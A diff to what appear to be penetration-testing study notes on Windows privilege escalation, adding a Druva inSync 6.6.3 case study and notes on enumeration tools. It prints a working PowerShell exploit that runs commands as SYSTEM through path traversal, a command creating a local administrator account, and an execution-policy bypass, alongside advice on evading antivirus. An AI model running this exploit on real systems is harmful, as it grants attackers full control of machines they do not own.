@@ -359,16 +359,116 @@ trace that indicates the existence of additional software.
 
 Search for existing exploits on Google, [exploit-db](https://www.exploit-db.com/) or [packet storm](https://packetstormsecurity.com/)
 
-| Name | Vendor | Version |
-|------|--------|---------|
-| Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910 | Microsoft Corporation | 14.28.29910 |
-| AWS Tools for Windows | Amazon Web Services Developer Relations | 3.15.1248 |
-| VNC Server 6.8.0 | RealVNC | 6.8.0.45849 |
-|Amazon SSM Agent | Amazon Web Services | 3.0.529.0 |
-| aws-cfn-bootstrap | Amazon Web Services | 2.0.5 |
-| Druva inSync 6.6.3 | Druva Technologies Pte. Ltd. | 6.6.3.0 |
-| AWS PV Drivers | Amazon Web Services | 8.3.4 |
-| Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910 | Microsoft Corporation | 14.28.29910 |
-
 **Case Study: Druva inSync 6.6.3**
 
+An RPC server runs on port 6064 with SYSTEM privileges, the exploit takes advantage of an 
+exposed procedure (procedure no. 5) allowing command execution. As the server runs as 
+SYSTEM, so do any executed commands.
+
+The vulnerability was patched by checking the path to the executable began with
+`C:\ProgramData\Druva\inSync4\` but this was easily circumvented with path traversal.
+
+To make a working exploit you must first understand how to talk to port 6064:
+![Packets sent](./pictures/rpc-packets.png)
+
+The first packet is a hello packet containing a fixed string. The second packet indicates 
+that we want to execute procedure no. 5. The last two packets are used to send the length of
+the command and the command string.
+
+The [original exploit](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html):
+
+```
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+
+Add the user pwnd as a local admin to elevate privileges
+
+`$cmd=net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add`
+
+### Tools of the Trade
+
+**[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)**
+
+WinPEAS is a script developed to enumerate the target system to uncover privilege 
+escalation paths. You can find more information about winPEAS and download either the 
+precompiled executable or a .bat script. WinPEAS will run commands similar to the ones 
+listed in the previous task and print their output. The output from winPEAS can be lengthy 
+and sometimes difficult to read. This is why it would be good practice to always redirect 
+the output to a file, as shown below:
+
+`winpeas.exe > outputfile.txt`
+
+**[PrivescCheck](https://github.com/itm4n/PrivescCheck)**
+
+PrivescCheck is a PowerShell script that searches common privilege escalation on the target 
+system. It provides an alternative to WinPEAS without requiring the execution of a binary 
+file.
+
+Reminder: To run PrivescCheck on the target system, you may need to bypass the execution 
+policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown 
+below.
+
+```
+PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+PS C:\> . .\PrivescCheck.ps1
+PS C:\> Invoke-PrivescCheck
+```
+
+**[WES-NG: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)**
+
+Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the 
+target system and run them there. This may cause antivirus software to detect and delete 
+them. To avoid making unnecessary noise that can attract attention, you may prefer to use 
+WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).
+
+Once installed, and before using it, type the `wes.py --update` command to update the 
+database. The script will refer to the database it creates to check for missing patches 
+that can result in a vulnerability you can use to elevate your privileges on the target 
+system.
+
+To use the script, you will need to run `systeminfo > systeminfo.txt` command on the target 
+system then move the text file to your attacking machine.
+
+Once this is done, wes.py can be run as follows;
+
+`wes.py systeminfo.txt`      
+
+**Metasploit**
+
+If you have a Meterpreter shell on the target use the `multi/recon/local_exploit_suggester`
+module to list potential vulnerabilities allowing privilege escalation.
+
+### Resources
+
+[PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+
+[Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
+
+[RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
+
+[Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+
+[Decoder's Blog](https://decoder.cloud/)
+
+[Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
+
+[Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
